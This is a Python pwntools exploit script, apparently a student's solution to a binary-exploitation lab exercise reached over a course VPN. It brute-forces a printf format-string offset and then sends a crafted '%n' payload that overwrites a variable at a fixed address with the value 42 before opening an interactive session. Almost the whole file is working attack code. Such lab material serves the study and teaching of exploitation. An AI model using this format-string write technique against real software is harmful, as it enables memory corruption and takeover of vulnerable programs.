#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 11)
EXE_FILENAME = '../pwn_student_binaries/the_answer_Federico-Conti'
argv = [EXE_FILENAME]
envp = {}

context.binary = e = ELF(EXE_FILENAME, checksec=False)

def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE_FILENAME)


# brute-force 
io = start()

offset_print = None

for i in range(1, 50):
    io = start()
    io.recvuntil(b"name?")
    payload = b"abcd%" + str(i).encode() + b"$lx"
    io.sendline(payload)
    io.recvuntil(b"Hi, ")
    leak = io.recvline().strip()
    io.close()
    # [+] offset found  13 --> b'abcd64636261'
    if b'64636261' in leak:
        log.success(f"offset found  {i} --> {leak}")
        offset_print = i
        break
    else:
        log.info(f"Offset {i}: {leak}")


ADDR   = 0x404564 # address of the variable to be overwritten (thanks Ghidra & no PIE :) )
TARGET = 0x2a  # 42 in dec; 1 byte


fmt     = f"%{TARGET}c%{offset_print}$n".encode() + b"\x00"
padding     = (- (len(fmt))) % 8
log.info(f"Pad bytes needed for 64-bit alignment: {padding}")

new_offset  = offset_print + (len(fmt)+1 + padding)//8
log.info(f"Index need to reach our address: {new_offset}")  

## new format string with adjusted offset
fmt = f"%{TARGET}c%{new_offset}$n".encode() + b"A"*padding + b"\x00"

payload  = fmt + p64(ADDR)

log.info(f"Final format string: {payload}")
# %42c%15$nAAAAAA\x00dE@\x00\x00\x00\x00\x00

io = start()
io.recvuntil(b"name?")
io.sendline(payload)
io.interactive()